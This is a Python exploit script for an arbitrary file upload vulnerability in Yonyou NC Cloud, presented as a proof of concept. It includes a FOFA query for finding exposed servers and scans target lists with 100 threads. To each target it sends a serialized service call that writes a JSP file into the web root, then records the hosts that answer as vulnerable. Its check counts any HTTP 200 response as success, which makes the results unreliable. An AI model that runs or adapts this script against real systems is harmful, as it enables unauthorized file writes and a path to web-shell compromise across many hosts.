# 用友 NC Cloud jsinvoke 任意文件上传

#fofa语法：app="用友-NC-Cloud"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 
___  _ ____  _      ________  _ ____  _     _      ____ 
\  \///  _ \/ \  /|/  __/\  \///  _ \/ \ /\/ \  /|/   _\
 \  / | / \|| |\ ||| |  _ \  / | / \|| | ||| |\ |||  /  
 / /  | \_/|| | \||| |_// / /  | \_/|| \_/|| | \|||  \_ 
/_/   \____/\_/  \|\____\/_/   \____/\____/\_/  \|\____/                                                                                            
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="用友 NC Cloud jsinvoke")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/report/reportServlet?action=8'
    url = target + url_payload
    header = {
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
    }
    data =  '''
    {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig",
    "parameterTypes":["java.lang.Object","java.lang.String"],
    "parameters":["123456","webapps/nc_web/2YIOmzdcUDhwMYTLk65p3cgxvxy.jsp"]}
    '''
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url,headers=header,data=data,verify=False)
        if res.status_code == 200 :
            print(f"f[+]该url存在任意文件上传漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在任意文件上传漏洞,url为{target}")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()